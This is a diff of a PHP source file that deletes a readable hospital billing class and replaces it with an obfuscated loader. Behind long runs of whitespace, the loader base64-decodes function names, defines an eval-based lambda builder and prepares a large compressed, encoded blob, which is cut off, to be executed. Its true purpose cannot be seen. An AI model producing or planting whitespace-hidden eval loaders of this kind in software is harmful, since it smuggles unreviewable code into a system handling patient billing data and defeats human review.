@@ -1,486 +1,391 @@
-<?php
+<?php 
+        $__='printf';$_='Loading This code is encrypted!';
+        
 
-defined('BASEPATH') or exit('No direct script access allowed');
 
-class BillingService
-{
-    protected $CI;
-	protected $hospitalMaster;
-    protected $roomCount;
-    
-    protected $patient_group_charges_with_discount = array(); //get patient group charges with discount for charges summary
-	protected $patient_mandatory_discounts; //get patient mandatory discounts
-	protected $miscellaneous_charges = array(); //store the summary of miscellaneous charges
 
-    protected $entry;
 
-	public function __construct()
-	{
-        $this->CI=&get_instance();
-        $this->CI->load->model('BillingModel');
-        $this->CI->load->model('EncounterModel');
-        $this->CI->load->model('DoctorsOrderModel');
-        $this->CI->load->model('AdmissionModel');
-    }
 
-    public function computeBill($enccode,$type,$entryby){
-        $this->entry = $entryby;
-        //get patient encounter
-        $encounter = $this->CI->EncounterModel->byEncounter($enccode);
-        //get patient account
-        $patientAcct = $this->CI->BillingModel->accountInformation($enccode);
-        //get phic
-        $phic = $this->CI->BillingModel->_phicComputation($enccode);
-        //get the confinement period
-        $confinePeriod = array();
-        $admissionLog = null;
-        if($encounter->toecode == 'ADM'){
-            $admissionLog = $this->CI->AdmissionModel->admissionLog($enccode);
-            $confinePeriod['admdate'] = $admissionLog->admdate;
-            if($admissionLog->disdate ==  NULL || $admissionLog->disdate == "" || empty($admissionLog->disdate)){
-                $dischargeOrder = $this->CI->DoctorsOrderModel->getDischargeOrder($enccode);
-                if(count($dischargeOrder) == 0){
-                    $confinePeriod['disdate'] = date('Y-m-d h:i:s');
-                }
-            }else{
-                $confinePeriod['disdate'] = $admissionLog->disdate;
-            }
-        }
-        //get setup
-        $billingSetup = $this->CI->BillingModel->getBillingSetup($confinePeriod['admdate']);
 
-        //get patient charges
-        $patietCharges = $this->CI->BillingModel->finalBill($enccode, $confinePeriod['admdate']);
 
-        $patient_group_charges = array();//store the amounts of grouping of charges
 
-        //get all the mandatory discounts
-		$discounts = $this->CI->BillingModel->getDiscounts($enccode,'P',true,'');
 
-        //get the patient occupied rooms
-		$room = $this->CI->BillingModel->getPatientRoom($enccode);
 
-        //compute the room charges
-		$roomDetails = $this->_getRoomDetails($room,$confinePeriod,$discounts,$billingSetup);
 
-        //merge the patient charges and room charges
-		$patietCharges = array_merge($patietCharges,$roomDetails);
 
-        $chargeDate = array_column($patietCharges,'pcchrgdte');
-		array_multisort($chargeDate,SORT_ASC,$patietCharges);
 
-        $total_itemdiscount = 0;
-        foreach ($patietCharges as $rows) {
-            $total_itemdiscount = 0;
-			//start get the total item discount
-			$pcchrgamt = $rows['pcchrgamt'];
-			if($pcchrgamt == NULL){
-				$pcchrgamt = 0;
-			}
-			if(count($discounts) > 0){
-                $total_itemdiscount = 0;
-				foreach($discounts as $discount){
-					$discount_amount = $discount->pdamt;
-					//$discounted_amount =  $rows['pcchrgamt'] * ($discount_amount/100);
-					$discounted_amount =  $pcchrgamt * ($discount_amount/100);
-					$total_itemdiscount = $total_itemdiscount + $discounted_amount;
-					if(isset($discount->discamount)){
-						$discount->discamount = $discount->discamount + $discounted_amount;
-					}else{
-						$discount->{'discamount'} = $discounted_amount;
-					}	
-				}
-				$this->patient_mandatory_discounts = $discounts;
-			}
-			//end get the total item discount
 
-			//start get all the miscellaneous charges to be used in the summary
-			if($rows['chrgtable'] == 'MISCE'){
-				if(array_key_exists($rows['chargname'],$this->miscellaneous_charges)){
-					$this->miscellaneous_charges[$rows['chargname']]['pcchrgamt'] = $this->miscellaneous_charges[$rows['chargname']]['pcchrgamt'] + $rows['pcchrgamt']; 
-				}else{
-					$this->miscellaneous_charges[$rows['chargname']] = $rows; 
-				}
-			}
-			//start get all the miscellaneous charges to be used in the summary
 
-			//start generate the patient group charges
-			if(array_key_exists($rows['chargcode'],$patient_group_charges)){
-				$charge_array = $patient_group_charges[$rows['chargcode']];
-				$charge_array['grpamount'] = $charge_array['grpamount'] + $pcchrgamt;//$rows['pcchrgamt'];
-				$patient_group_charges[$rows['chargcode']] = $charge_array;
-				$charge_array = $this->patient_group_charges_with_discount[$rows['chargcode']];
-				$charge_array['discamt'] = $charge_array['discamt'] + $total_itemdiscount;
-				$this->patient_group_charges_with_discount[$rows['chargcode']] = $charge_array;
-			}else{
-				$charge_array = array(
-					"enccode"=>$enccode,
-					"hpercode"=>$encounter->hpercode,
-					"acctno"=>$patientAcct->paacctno,
-					"chargcode"=>$rows['chargcode'],
-					"grpamount"=>$pcchrgamt,
-					"totamtpaid"=>"",
-					"grpbalance"=>"",
-					"dteupd1"=>date("Y-m-d h:i:s"),
-					"tmeupd1"=>date("Y-m-d h:i:s"),
-					"hstatus"=>"A",
-					"hlock"=>"N",
-					"datemod"=> null,
-					"updsw"=>"P",
-					"confdl"=>"N",
-					"entryby"=>$this->entry	
-				);
-				$patient_group_charges[$rows['chargcode']] = $charge_array;
-				$charge_array['discamt'] = $total_itemdiscount;
-				$this->patient_group_charges_with_discount[$rows['chargcode']] = $charge_array;
-			}
-		}
-		//end generate the patient group charges
 
-		//start save the patient group charges
-		$ids = array('enccode'=> $enccode);
-		$this->CI->BillingModel->delete('hpatgrpchrg',$ids);
-		
-		foreach ($patient_group_charges as $group_charge) {
-			$ids = array(
-				'enccode' => $group_charge['enccode'],
-				'acctno' => $group_charge['acctno'],
-				'chargcode' => $group_charge['chargcode']
-				);
-		if($this->CI->BillingModel->checkExists($ids,'hpatgrpchrg')){
-				$group_charge['datemod'] = date("Y-m-d h:i:s");
-				$group_charge['entryby'] = $this->entry;
-				$result = $this->CI->BillingModel->update('hpatgrpchrg',$group_charge,$ids);
-			}else{
-				$result = $this->CI->BillingModel->insert($group_charge,'hpatgrpchrg');
-			}
-		}
-		//end save the patient group charges
 
-        $totchrm = 0;
-		$totchdm = 0;
-		$totchxr = 0; 
-		$totchor = 0; 
-		$totchot = 0;
 
-        $groupCharges = $this->CI->BillingModel->getPatientGroupCharges($enccode);
-		
-        $misce = array();
-		$total_misc = 0;
-		$total_hcifees = 0;
-		$mandatory_discamount_misc = 0;
-		foreach($groupCharges as $groupCharge){
-			if($groupCharge->chrgtable == 'MISCE'){
-				$misce[] = $groupCharge;
-				$total_misc = $total_misc + $groupCharge->grpamount;
-				$total_hcifees = $total_hcifees + $groupCharge->grpamount;
-				$mandatory_discamount = 0;
-				if(array_key_exists($groupCharge->chargcode,$this->patient_group_charges_with_discount)){
-					$mandatory_discamount_misc = $mandatory_discamount_misc + $this->patient_group_charges_with_discount[$groupCharge->chargcode]['discamt'];
-				}
 
-				if($groupCharge->bentypcod == 'ROBOR'){
-					$totchrm = $totchrm + $groupCharge->grpamount;
-				}
-	
-				if($groupCharge->bentypcod == 'DRUME'){
-					$totchdm = $totchdm + $groupCharge->grpamount;
-				}
-	
-				if($groupCharge->bentypcod == 'XRAYL'){
-					$totchxr = $totchxr + $groupCharge->grpamount;
-				}
-	
-				if($groupCharge->bentypcod == 'OTHOS'){
-					$totchot = $totchot + $groupCharge->grpamount;
-				}
-	
-				if($groupCharge->bentypcod == 'ORFEE'){
-					$totchor = $totchor + $groupCharge->grpamount;
-				}
-				continue;
-			}
-			
-			if($groupCharge->bentypcod == 'ROBOR'){
-				$totchrm = $totchrm + $groupCharge->grpamount;
-			}
 
-			if($groupCharge->bentypcod == 'DRUME'){
-				$totchdm = $totchdm + $groupCharge->grpamount;
-			}
 
-			if($groupCharge->bentypcod == 'XRAYL'){
-				$totchxr = $totchxr + $groupCharge->grpamount;
-			}
 
-			if($groupCharge->bentypcod == 'OTHOS'){
-				$totchot = $totchot + $groupCharge->grpamount;
-			}
 
-			if($groupCharge->bentypcod == 'ORFEE'){
-				$totchor = $totchor + $groupCharge->grpamount;
-			}
 
-			if($groupCharge->chargcode == 'ROBOR'){
-			 	$groupCharge->chrgdesc = 'Room and Board';
-			}
 
-			$mandatory_discamount = 0;
-			if(array_key_exists($groupCharge->chargcode,$this->patient_group_charges_with_discount)){
-				$mandatory_discamount =  $this->patient_group_charges_with_discount[$groupCharge->chargcode]['discamt'];
-			}
-			$total_hcifees = $total_hcifees + $groupCharge->grpamount;
-		}
 
-		$patient_mandatory_discounts_subtotal_hci = 0;
-		if(isset($this->patient_mandatory_discounts) && count($this->patient_mandatory_discounts) > 0){
-			foreach($this->patient_mandatory_discounts as $patient_mandatory_discount){
-				$patient_mandatory_discounts_subtotal_hci = $patient_mandatory_discounts_subtotal_hci + $patient_mandatory_discount->discamount;
-			}
-		}
 
-        $phicPackageHCI = new stdClass();
-        if($phic && $encounter->phicclaim == "Y"){
-            $phicPackageHCI = $this->CI->BillingModel->getPHICPackageHCI($enccode);
-            if(empty($phicPackageHCI->amthosp1) || $phicPackageHCI->amthosp1 == NULL || $phicPackageHCI->amthosp1 == 0){
-                $phicPackageHCI->amthosp1 = 0;
-            }
-            if(empty($phicPackageHCI->amthosp2) || $phicPackageHCI->amthosp2 == NULL || $phicPackageHCI->amthosp2 == 0){
-                $phicPackageHCI->amthosp2 = 0;
-            }
-        }else{
-            $phicPackageHCI->{'amthosp1'} = 0;
-            $phicPackageHCI->{'amthosp2'} = 0;
-        }
 
-		$amount_after_mandatory_disc_hci = $total_hcifees - $patient_mandatory_discounts_subtotal_hci;
-		$balance_hci = $total_hcifees - $patient_mandatory_discounts_subtotal_hci - $phicPackageHCI->amthosp1 - $phicPackageHCI->amthosp2;
-		if($balance_hci < 0) $balance_hci = 0;
-		
-		$pfFees = $this->CI->BillingModel->_profserv($enccode);
 
-        $phicPackagePF = new stdClass();
-        if($phic && $encounter->phicclaim == "Y"){
-            $phicPackagePF = $this->CI->BillingModel->getPHICPackagePF($enccode);
-            if(empty($phicPackagePF->amtpf1) || $phicPackagePF->amtpf1 == NULL || $phicPackagePF->amtpf1 == 0){
-                $phicPackagePF->amtpf1 = 0;
-            }
-            if(empty($phicPackagePF->amtpf2) || $phicPackagePF->amtpf2 == NULL || $phicPackagePF->amtpf2 == 0){
-                $phicPackagePF->amtpf2 = 0;
-            }
-        }else{
-            $phicPackagePF->{'amtpf1'} = 0;
-            $phicPackagePF->{'amtpf2'} = 0;
-        }
 
-		$total_pffees = 0;
-		$balance_pf = 0;
-		$patient_mandatory_discounts_subtotal_pf = 0;
-        $amount_after_mandatory_disc_pf = 0;
-		if(count($pfFees) > 0){
-			$discounts_pf = $this->CI->BillingModel->getDiscounts($enccode,'P',true,'P');
 
-			foreach($pfFees as $pfFee){
-				//start get the total pf discount
-				$total_itemdiscount = 0;
-				if(count($discounts_pf) > 0){
-					foreach($discounts_pf as $key => $discount){
-						$discount_amount = $discount->pdamt;
-						$discounted_amount =  $pfFee['pfamt'] * ($discount_amount/100);
-						$total_itemdiscount = $total_itemdiscount + $discounted_amount;
-						if(isset($discount->discamountpf)){
-							$discount->discamountpf = $discount->discamountpf + $discounted_amount;
-						}else{
-							$discount->{'discamountpf'} = $discounted_amount;
-						}	
-						$discounts_pf[$key] = $discount;
-					}
-					//$this->patient_mandatory_discounts = $discounts;
-				}
-				//end start get the total total pf discount
-				
-				$total_pffees = $total_pffees + $pfFee['pfamt'];
-			}
 
-			foreach($discounts_pf as $discount_pf){
-				$patient_mandatory_discounts_subtotal_pf = $patient_mandatory_discounts_subtotal_pf + $discount_pf->discamountpf;
-			}
-			
-			$amount_after_mandatory_disc_pf = $total_pffees - $patient_mandatory_discounts_subtotal_pf;
-			$balance_pf = $total_pffees - $patient_mandatory_discounts_subtotal_pf - $phicPackagePF->amtpf1 - $phicPackagePF->amtpf2;
-			if($balance_pf < 0) $balance_pf = 0;
-		}
-		
-        if($phic && $encounter->phicclaim == "Y"){
-            $patient_contribution = array(
-                "enccode" => $enccode,
-                "hpercode" => $encounter->hpercode,
-                "phicdteas" => date("Y-m-d h:i:s"),
-                "phictmeas" => date("Y-m-d h:i:s"),
-                "totchrm" => $totchrm,
-                "totchdm" => $totchdm, 
-                "totchxr" => $totchxr, 
-                "totchor" => $totchor, 
-                "totchot" => $totchot,
-                "paacctno" => $patientAcct->paacctno,
-                "disamt" => $amount_after_mandatory_disc_hci,
-                "disamtpf" => $amount_after_mandatory_disc_pf);
-    
-            $ids = array(
-                'enccode' => $patient_contribution['enccode'],
-                'paacctno' => $patient_contribution['paacctno']
-            );
-            
-            if($this->CI->BillingModel->checkExists($ids,'hphcont')){
-                $result = $this->CI->BillingModel->update('hphcont',$patient_contribution,$ids);
-            }else{
-                $result = $this->CI->BillingModel->insert($patient_contribution,'hphcont');
-            }
-        }
-		
-        $patotamt = $total_hcifees + $total_pffees;
-        $patotdisc = $patient_mandatory_discounts_subtotal_hci + $patient_mandatory_discounts_subtotal_pf;
-        $panetamt = $patotamt - $patotdisc;
-        $papay = 0;
-        $pabal = $panetamt - $papay;
-        $paphic = ($phicPackageHCI->amthosp1 + $phicPackageHCI->amthosp2) + ($phicPackagePF->amtpf1 + $phicPackagePF->amtpf2);
 
-		$patient_account = array(
-			"paacctno" => $patientAcct->paacctno,
-			"enccode" => $enccode,
-			"hpercode" => $encounter->hpercode,
-			"padteas" => date("Y-m-d h:i:s"), 
-			"patmeas" => date("Y-m-d h:i:s"), 
-			"patotchrg" => $total_hcifees,
-			"patotprof" => $total_pffees, 
-			"patotamt" => $patotamt, 
-			"patotdisc" => $patotdisc, 
-			"patmsstot" => 0, 
-			"panetamt" => $panetamt, 
-			"papay" => $papay, 
-			"pabal" => $pabal, 
-			"pastat" => 0, 
-			"palock" => "N",
-			"updsw" => "P", 
-			"confdl" => "N", 
-			"ptdisc" => 0, 
-			"paphic" => $paphic, 
-			"adjdrugs" => 0
-		);
 
-		$ids = array(
-			'enccode' => $patient_account['enccode'],
-			'paacctno' => $patient_account['paacctno']
-		);
 
-		if($this->CI->BillingModel->checkExists($ids,'hpatacct')){
-			$patient_account['datemod'] = date("Y-m-d h:i:s");
-			$patient_account['entryby'] = $this->entry;
-			$result = $this->CI->BillingModel->update('hpatacct',$patient_account,$ids);
-		}else{
-			$result = $this->CI->BillingModel->insert($patient_account,'hpatacct');
-		}
-    }
 
-    public function _getRoomDetails($roomDetails,$confinePeriod,$discounts,$billingSetup){
-		$roomComputations = array();
-		foreach ($roomDetails as $key => $roomDetail) {
-			$roomComputation = array();
-			$rmrate = $roomDetail['rmrate'];
-			$roomComputation['rmrate'] = $rmrate;
-			$hprdate = $roomDetail['hprdate'];
 
-			$roomComputation["enccode"] = $roomDetail['enccode'];
-			$roomComputation["pcchrgdte"] = $hprdate;
-			$roomComputation["chargcode"] = "ROBOR";
-			$roomComputation["uomdtl"] = "";
-			$roomComputation["uomdtl1"] = "840";
-			$roomComputation["chargname"] = "ROOM AND BOARD ACCOMODATION";
-			$roomComputation["pdamt"] = null;
-			$roomComputation["pdtyp"] = null;
-			$roomComputation["bentypcod"] = "ROBOR";
-			$roomComputation["chrgtable"] = null;
-			$roomComputation["itemcode"] = "";
-			$roomComputation["chargeseq"] = "6";
-			$roomComputation["estatus"] = "";
-			$roomComputation["orinclst"] = "A";
-			$roomComputation["pchrgup"] = $roomDetail['rmrate'];
-			$roomComputation["compense"] = "";
-			$roomComputation["amt"] = "0";
-			$roomComputation["disamt"] = "0";
-			$roomComputation["tbl"] = "hpatroom";
-			$roomComputation["doco"] = $roomDetail["bdintkey"];
 
-			if(array_key_exists($key + 1,$roomDetails)){
-				$nexthprdate = $roomDetails[$key + 1]['hprdate'];
-				$hprdate_value = date_create($hprdate);
-				$nexthprdate_value = date_create($nexthprdate);
-				$roomComputation["pcchrgcod"] = date("m/d/Y",strtotime($nexthprdate));
-				$datediff = date_diff($hprdate_value,$nexthprdate_value);
-				$confinementdays = $datediff->days;//round($datediff / (60 * 60 * 24));
-				if($confinementdays == 0 && $billingSetup->sbasrm == 'BDATE') {
-					$confinementdays = 1;
-				}else{
-					if($billingSetup->sbasrm == 'BDATE'){
-						$hprdate_valuetime = date("H:i:s",strtotime($hprdate));
-						$nexthprdate_valuetime = date("H:i:s",strtotime($nexthprdate));
-						if($nexthprdate_valuetime < $hprdate_valuetime){
-							$confinementdays = $confinementdays + 1;
-						}
-					}
 
-					if($billingSetup->sbasrm == 'CUTOF'){
-					 	$cutoffTime = date("H:i:s",strtotime($billingSetup->scuttime));
-						$nexthprdate_valuetime = date("H:i:s",strtotime($nexthprdate));
-						
-					 	if($nexthprdate_valuetime > $cutoffTime){
-					 		$confinementdays = $confinementdays + 1;
-					 	}else{
-							if($confinementdays == 0) $confinementdays = 1;
-						}
-					}
-				}
-				$this->roomCount = $this->roomCount + $confinementdays;
-				$roomComputation["chrgdesc"] = 'ROOM - ' . $roomDetail['wardname'] .' '. $roomDetail['rmname'] .' '. $roomDetail['bdname'] .' ('.$confinementdays.' day/s)';
-				$pcchrgamt = $rmrate * $confinementdays;
-				$roomComputation['pcchrgamt'] = $pcchrgamt;
-			}else{
-				$nexthprdate = $confinePeriod['disdate'];
-				$hprdate_value = date_create($hprdate);
-				$nexthprdate_value = date_create($nexthprdate);
-				$roomComputation["pcchrgcod"] = date("m/d/Y",strtotime($nexthprdate));
-				$datediff = date_diff($hprdate_value,$nexthprdate_value);
-				$confinementdays = $datediff->days;//round($datediff / (60 * 60 * 24));
-				if($confinementdays == 0 && $billingSetup->sbasrm == 'BDATE') {
-					$confinementdays = 1;
-				}else{
-					if($billingSetup->sbasrm == 'BDATE'){
-						$hprdate_valuetime = date("H:i:s",strtotime($hprdate));
-						$nexthprdate_valuetime = date("H:i:s",strtotime($nexthprdate));
-						if($nexthprdate_valuetime < $hprdate_valuetime){
-							$confinementdays = $confinementdays + 1;
-						}
-					}
 
-					if($billingSetup->sbasrm == 'CUTOF'){
-					 	$cutoffTime = date("H:i:s",strtotime($billingSetup->scuttime));
-						$nexthprdate_valuetime = date("H:i:s",strtotime($nexthprdate));
 
-					 	if($nexthprdate_valuetime > $cutoffTime){
-					 		$confinementdays = $confinementdays + 1;
-					 	}else{
-							$confinementdays = 1;
-						}
-					}
-				}
-				$this->roomCount = $this->roomCount + $confinementdays;
-				$roomComputation["chrgdesc"] = 'ROOM - ' . $roomDetail['wardname'] .' '. $roomDetail['rmname'] .' '. $roomDetail['bdname'] .' ('.$confinementdays.' day/s)';
-				$pcchrgamt = $rmrate * $confinementdays;
-				$roomComputation['pcchrgamt'] = $pcchrgamt;
-			}
-			$roomComputations[] = $roomComputation;
-		}
-		return $roomComputations;
-	}
 
-}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                                                                                                                                                                                                $_____='    b2JfZW5kX2NsZWFu';                                                                                                                                                                              $______________='cmV0dXJuIGV2YWwoJF8pOw==';
+$__________________='X19sYW1iZGE=';
+                                                                                                                                                                                                                                          $______=' Z3p1bmNvbXByZXNz';                    $___='  b2Jfc3RhcnQ=';                                                                                                    $____='b2JfZ2V0X2NvbnRlbnRz';                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                $__=                                                              'base64_decode'                           ;                                                                       $______=$__($______);           if(!function_exists('__lambda')){function __lambda($sArgs,$sCode){return eval("return function($sArgs){{$sCode}};");}}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    $__________________=$__($__________________);                                                                                                                                                                                                                                                                                                                                                                         $______________=$__($______________);
+        $__________=$__________________('$_',$______________);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $_____=$__($_____);                                                                                                                                                                                                                                                    $____=$__($____);                                                                                                                    $___=$__($___);                      $_='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